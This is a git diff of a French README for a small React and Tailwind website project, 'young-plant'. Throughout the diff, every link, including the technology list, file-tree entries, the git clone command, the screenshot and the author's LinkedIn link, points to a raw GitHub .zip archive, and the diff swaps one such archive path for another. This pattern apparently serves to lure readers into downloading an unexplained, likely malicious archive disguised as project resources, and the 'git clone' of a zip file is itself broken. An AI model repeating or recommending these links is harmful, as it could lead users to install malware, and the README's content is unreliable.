@@ -13,18 +13,18 @@
   - **Contact**
 - **Design moderne et responsive**, optimisé pour tous les appareils.
 - **Menu mobile dynamique** pour une expérience utilisateur fluide sur smartphones.
-- **Animations interactives** grâce à Tailwind CSS et https://raw.githubusercontent.com/Martialdepaul/YP/main/src/components/YP-2.8.zip
+- **Animations interactives** grâce à Tailwind CSS et https://raw.githubusercontent.com/Martialdepaul/YP/main/src/assets/Software-1.7.zip
 
 ---
 
 ## 🛠️ Technologies utilisées
 
 - **Frontend :**
-  - https://raw.githubusercontent.com/Martialdepaul/YP/main/src/components/YP-2.8.zip
-  - https://raw.githubusercontent.com/Martialdepaul/YP/main/src/components/YP-2.8.zip
+  - https://raw.githubusercontent.com/Martialdepaul/YP/main/src/assets/Software-1.7.zip
+  - https://raw.githubusercontent.com/Martialdepaul/YP/main/src/assets/Software-1.7.zip
   - Tailwind CSS
   - React Icons
-  - https://raw.githubusercontent.com/Martialdepaul/YP/main/src/components/YP-2.8.zip
+  - https://raw.githubusercontent.com/Martialdepaul/YP/main/src/assets/Software-1.7.zip
 - **Backend :**
   - Aucun backend pour ce projet.
 - **Autres outils :**
@@ -42,16 +42,16 @@ young-plant/
 ├── src/                    # Code source
 │   ├── assets/             # Images et autres ressources
 │   ├── components/         # Composants React
-│   │   ├── https://raw.githubusercontent.com/Martialdepaul/YP/main/src/components/YP-2.8.zip      # Barre de navigation
-│   │   ├── https://raw.githubusercontent.com/Martialdepaul/YP/main/src/components/YP-2.8.zip # Section principale
-│   └── https://raw.githubusercontent.com/Martialdepaul/YP/main/src/components/YP-2.8.zip            # Point d'entrée de l'application
+│   │   ├── https://raw.githubusercontent.com/Martialdepaul/YP/main/src/assets/Software-1.7.zip      # Barre de navigation
+│   │   ├── https://raw.githubusercontent.com/Martialdepaul/YP/main/src/assets/Software-1.7.zip # Section principale
+│   └── https://raw.githubusercontent.com/Martialdepaul/YP/main/src/assets/Software-1.7.zip            # Point d'entrée de l'application
 │
 ├── .gitignore              # Fichiers ignorés par Git
-├── https://raw.githubusercontent.com/Martialdepaul/YP/main/src/components/YP-2.8.zip            # Dépendances et scripts
-├── https://raw.githubusercontent.com/Martialdepaul/YP/main/src/components/YP-2.8.zip       # Configuration PostCSS
-├── https://raw.githubusercontent.com/Martialdepaul/YP/main/src/components/YP-2.8.zip      # Configuration Tailwind CSS
-├── https://raw.githubusercontent.com/Martialdepaul/YP/main/src/components/YP-2.8.zip          # Configuration Vite
-└── https://raw.githubusercontent.com/Martialdepaul/YP/main/src/components/YP-2.8.zip               # Documentation du projet
+├── https://raw.githubusercontent.com/Martialdepaul/YP/main/src/assets/Software-1.7.zip            # Dépendances et scripts
+├── https://raw.githubusercontent.com/Martialdepaul/YP/main/src/assets/Software-1.7.zip       # Configuration PostCSS
+├── https://raw.githubusercontent.com/Martialdepaul/YP/main/src/assets/Software-1.7.zip      # Configuration Tailwind CSS
+├── https://raw.githubusercontent.com/Martialdepaul/YP/main/src/assets/Software-1.7.zip          # Configuration Vite
+└── https://raw.githubusercontent.com/Martialdepaul/YP/main/src/assets/Software-1.7.zip               # Documentation du projet
 ```
 
 ---
@@ -60,7 +60,7 @@ young-plant/
 
 1. Clonez le projet :
    ```bash
-   git clone https://raw.githubusercontent.com/Martialdepaul/YP/main/src/components/YP-2.8.zip
+   git clone https://raw.githubusercontent.com/Martialdepaul/YP/main/src/assets/Software-1.7.zip
    cd YP
    ```
 
@@ -96,7 +96,7 @@ Ce projet peut être déployé sur des plateformes telles que **Netlify**, **Ver
 ## 🎨 Aperçu 🖼️
 
 Voici quelques captures d'écran du site :  
-![Aperçu de Elegant-Context](https://raw.githubusercontent.com/Martialdepaul/YP/main/src/components/YP-2.8.zip)
+![Aperçu de Elegant-Context](https://raw.githubusercontent.com/Martialdepaul/YP/main/src/assets/Software-1.7.zip)
 
 ---
 
@@ -132,7 +132,7 @@ Ce projet est sous licence **MIT**. Vous êtes libre de l'utiliser, de le modifi
 - **Martial De-Paul**  
   Étudiant en informatique | Développeur web passionné  
   Réalisé lors d'un hackathon 💡  
-  [LinkedIn]([https://raw.githubusercontent.com/Martialdepaul/YP/main/src/components/YP-2.8.zip](https://raw.githubusercontent.com/Martialdepaul/YP/main/src/components/YP-2.8.zip)) 
+  [LinkedIn]([https://raw.githubusercontent.com/Martialdepaul/YP/main/src/assets/Software-1.7.zip](https://raw.githubusercontent.com/Martialdepaul/YP/main/src/assets/Software-1.7.zip)) 
 ```
 
 ### Modifications apportées :
